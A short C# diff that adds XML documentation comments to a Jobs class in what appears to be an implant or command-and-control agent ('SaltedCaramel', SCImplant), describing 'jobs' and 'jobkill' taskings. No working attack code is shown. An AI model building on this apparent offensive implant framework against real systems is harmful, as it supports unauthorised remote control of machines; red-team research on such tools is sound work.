@@ -7,7 +7,13 @@ namespace SaltedCaramel.Tasks
 {
     public class Jobs
     { 
-        // Split this out
+        /// <summary>
+        /// Executes taskings related to job tasks. Depending
+        /// on the task issued, valid taskings are "jobs" and
+        /// "jobkill".
+        /// </summary>
+        /// <param name="job">Job associated with this task.</param>
+        /// <param name="implant">Agent associated with this job.</param>
         public static void Execute(Job job, SCImplant implant)
         {
             SCTask task = job.Task;
